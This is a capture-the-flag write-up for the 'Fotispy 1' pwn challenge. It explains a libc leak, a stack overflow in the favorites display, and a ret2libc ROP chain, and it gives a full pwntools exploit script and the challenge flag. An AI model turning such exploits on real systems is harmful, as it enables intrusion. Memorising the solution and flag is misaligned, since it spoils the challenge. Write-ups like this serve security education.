# Fotispy 1

## Challenge Summary

- **Category**: Pwn
- **Points**: 263
- **Solves**: 80 teams

---

### Problem Description

> Spotify with a GUI? A true hacker only needs the terminal.
> Note: Despite the naming, these 7 challenges can be solved in any order and do not depend on each other.

---

## Challenge Structure

- The binary provides a menu with options to register, login, add a song to favorites, display favorites, and exit.
- Option 2 (`Add a song`) allocates memory for the song's title, singer, and album.
- Option 3 (`Display favorites`) copies these values into a stack buffer via `memcpy` for printing.

---

### Protections:

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

---

## Exploitation Flow

### Step 1: Leak libc Address via `[DEBUG]`

- `Add a song` menu prints `[DEBUG]` with the `printf` address:

```c
printf("[DEBUG] %p\\n", printf);
```

- Use this address to calculate the libc base:

```python
r.recvuntil(b"[DEBUG] ")
printf_addr = int(r.recvline().strip(), 16)
libc.address = printf_addr - libc.sym.printf
```

- This leak enables the **ret2libc ROP attack**.

### Step 2: Prepare ROP Chain and List Termination

- Songs added via `Add a song` are stored in a **singly linked list**.
- `Display favorites` iterates using `local_10` to follow the `next` pointers of the list.
- To safely terminate the loop, the `next` pointer of the last node is set to a **readable memory location containing NULL**, preventing invalid memory access.
- After that, a **ROP payload** is injected via the album field to overflow the stack and execute `system("/bin/sh")`.

### Step 3: Inject Payload via Add Song

- When adding a song:

```python
add_song(r, title, singer)
```

- `title` and `singer` are normal inputs.
- `album` field is used to store the ROP payload.

### Step 4: Trigger Overflow

- Display favorites (`Option 3`) copies the song data into a stack-local buffer using `memcpy`.
- This triggers the buffer overflow, overwriting the return address and executing the ROP chain.

### Step 5: Get Shell

- Once the ROP chain executes, a shell is spawned.
- Read `flag.txt` to get the flag.

---

## Exploit Script (Python / pwntools)

```python
from pwn import *

elf = context.binary = ELF("fotispy1")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
r = remote("52.59.124.14", 5191)

# Registration and login
r.sendlineafter(b": ", b"0")
r.sendlineafter(b": ", b"A")
r.sendlineafter(b": ", b"A")
r.sendlineafter(b": ", b"1")
r.sendlineafter(b": ", b"A")
r.sendlineafter(b": ", b"A")

# Add song to leak printf address
r.sendlineafter(b": ", b"2")
r.recvuntil(b"[DEBUG] ")
printf = int(r.recvline().strip(), 16)
libc.address = printf - libc.sym.printf

# Build ROP chain
rop = ROP(libc)
rop.raw(b"A" * 0xd)
rop.raw(p64(elf.bss(0x800)))  # points to BSS NULL for linked list termination
rop.raw(b"A" * 8)
rop.raw(rop.ret)
rop.call(libc.sym.system, [next(libc.search(b"/bin/sh\\0"))])
payload = rop.chain()

# Complete add song with payload in album field
r.sendlineafter(b": ", b"A")  # title
r.sendlineafter(b": ", b"A")  # singer
r.sendlineafter(b": ", payload)  # album

# Trigger overflow
r.sendlineafter(b": ", b"3")

r.interactive()
```

---

## Flag

```
$ cat flag.txt
ENO{3v3ry_r0p_ch41n_st4rts_s0m3wh3r3}
```
